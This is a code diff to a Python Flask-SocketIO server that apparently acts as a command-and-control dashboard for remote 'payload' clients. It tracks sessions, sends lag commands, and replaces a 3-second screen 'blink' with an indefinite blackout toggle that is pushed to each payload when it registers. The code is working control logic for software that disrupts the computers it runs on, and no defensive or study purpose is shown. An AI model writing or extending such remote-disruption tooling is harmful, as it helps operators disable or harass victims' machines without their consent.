@@ -57,6 +57,19 @@ def handle_lag(data):
         socketio.emit('command_update_lag', {'status': status, 'intensity': intensity}, namespace='/payload', room=sid)
         emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
 
+@socketio.on('update_blackout_state', namespace='/dashboard')
+def handle_blackout(data):
+    """
+    Handles the 'SCREEN' switch from dashboard.
+    Toggles indefinite black screen on payload.
+    """
+    sid = data.get('session_id')
+    status = data.get('status') # 'on' or 'off'
+    if sid in sessions:
+        sessions[sid]['blackout_status'] = status
+        socketio.emit('command_blackout', {'status': status}, namespace='/payload', room=sid)
+        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
+
 @socketio.on('delete_session', namespace='/dashboard')
 def delete_session(data):
     sid = data.get('session_id')
@@ -67,16 +80,6 @@ def delete_session(data):
         if sid in sessions:
             del sessions[sid]
             emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
-
-@socketio.on('blink_session', namespace='/dashboard')
-def blink_session(data):
-    """
-    Handles the 'BLINK' button. Sends command to black out screen for 3s.
-    """
-    sid = data.get('session_id')
-    if sid in sessions:
-        print(f"Server: Issuing BLINK to {sid}")
-        socketio.emit('command_blink', {}, namespace='/payload', room=sid)
 
 @socketio.on('update_nametag', namespace='/dashboard')
 def update_nametag(data):
@@ -113,7 +116,8 @@ def payload_register(data):
             'status': 'online', 
             'last_seen': time.time(), 
             'lag_status': 'off',
-            'lag_intensity': 5
+            'lag_intensity': 5,
+            'blackout_status': 'off' # Default to screen ON (blackout OFF)
         }
     else:
         sessions[sid]['status'] = 'online'
@@ -121,9 +125,14 @@ def payload_register(data):
         
     socketio.emit('session_list_update', sessions, namespace='/dashboard')
     
+    # Sync states immediately
     emit('command_update_lag', {
         'status': sessions[sid]['lag_status'], 
         'intensity': sessions[sid]['lag_intensity']
+    }, namespace='/payload', room=sid)
+    
+    emit('command_blackout', {
+        'status': sessions[sid]['blackout_status']
     }, namespace='/payload', room=sid)
 
 @socketio.on('payload_heartbeat', namespace='/payload')
